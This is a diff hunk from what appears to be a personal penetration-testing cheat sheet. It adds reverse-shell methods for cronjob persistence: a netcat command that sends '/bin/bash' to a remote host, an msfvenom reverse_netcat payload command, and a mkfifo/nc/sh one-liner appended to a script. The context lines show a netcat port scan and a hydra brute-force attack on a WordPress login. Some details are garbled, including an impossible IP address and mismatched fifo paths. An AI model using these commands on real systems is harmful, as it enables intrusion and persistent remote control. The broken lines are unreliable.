@@ -191,9 +191,14 @@ nc -zuv 10.11.1.226 1-100->port range
 Searching in metapsloit with keywords:
 search platform:windows bid:5411
 
-NETCAT for cronjobs:
+NETCAT for cronjobs (mthod 1):
 #!/bin/bash
 nc -c /bin/bash\ -i 192.168.1129.1119 5555 0>&1
+
+(mthod 2):
+msfvenom -p cmd/unix/reverse_netcat lhost=10.0.2.4 lport=8888 R #generates payload below which can be echoed to a script
+
+echo "mkfifo /tmpmzlat; nc <ip> <port> 0</tmp/zlat | /bin/sh >/tmp/zlat 2>&1; rm /tmp/zlat" >> script
 
 bruteforcing wplogin hydra
 hydra -l admin -P /home/kali/Desktop/10.11.1/rockyou.txt 10.11.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log 
